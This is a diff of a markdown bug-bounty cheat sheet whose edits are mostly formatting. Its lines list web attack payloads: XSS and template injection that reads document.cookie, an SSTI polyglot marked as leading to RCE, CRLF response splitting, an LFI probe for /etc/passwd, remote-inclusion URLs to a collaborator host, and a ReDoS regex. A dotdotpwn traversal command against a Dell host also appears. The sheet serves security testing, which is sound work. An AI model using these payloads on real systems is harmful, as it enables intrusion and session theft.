@@ -23,7 +23,7 @@ dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f 
 
 #### Manual Testing (Credit: HackTricks)
 
-*   **XSS**&#x20;
+*   **XSS**
 
     ```python
     <img src=x onerror=alert("XSS_By_h0tak88r")> 
@@ -43,12 +43,16 @@ dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f 
     <https://hackerone.com/reports/59372> -> Homograph Attack
     ```
     {% endcode %}
-*   **CSTI**&#x20;
 
-    ```
-    {{7*7}}[7*7]→ {{3*3}}
-    {{constructor.constructor('alert(document.cookie)')()}}
-    ```
+\* \*\*CSTI\*\*
+
+````
+```
+{{7*7}}[7*7]→ {{3*3}}
+{{constructor.constructor('alert(document.cookie)')()}}
+```
+````
+
 * **SSTI** → `{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\\` → **RCE**
 *   **Command Injection →**
 
@@ -68,7 +72,7 @@ dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f 
     %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
     ```
 * **Dangled Markup \[ HTML Injection ] →** `<br>lol<b><h1>THIS IS AND INJECTED TITLE </h1>`
-*   **Local File Inclusion**&#x20;
+*   **Local File Inclusion**
 
     ```jsx
     /etc/passwd
@@ -82,7 +86,7 @@ dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f 
     <http://asdasdasdasd.burpcollab.com/mal.php>
     \\\\asdasdasdasd.burpcollab.com/mal.php
     ```
-*   **ReDOS**&#x20;
+*   **ReDOS**
 
     ```python
     (\\\\w*)+$
